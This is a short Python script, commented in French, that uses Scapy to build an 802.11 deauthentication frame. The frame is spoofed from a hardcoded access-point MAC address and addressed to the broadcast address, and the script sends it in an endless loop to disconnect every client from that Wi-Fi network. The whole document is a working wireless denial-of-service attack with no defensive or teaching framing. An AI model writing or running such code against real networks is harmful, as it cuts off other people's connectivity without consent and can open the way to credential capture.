from scapy.all import *

def deauth_all(ap_mac, interface):
    # Créer un paquet de déauthentification
    packet = Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=ap_mac, addr3=ap_mac, subtype=0x00)
    packet /= Dot11Deauth(reason=7)  # 7 = code de raison pour un cadre de classe 3 reçu d'un STA non associé

    # Envoyer le paquet en boucle
    while True:
        sendp(packet, iface=interface, count=1, verbose=False)
        print(f"Deauthenticating all devices from {ap_mac}")

# Remplacez par l'adresse MAC du point d'accès et l'interface réseau
ap_mac = "08:36:C9:98:11:A9"  # MAC du point d'accès
interface = "wlan1"           # Interface réseau

deauth_all(ap_mac, interface)
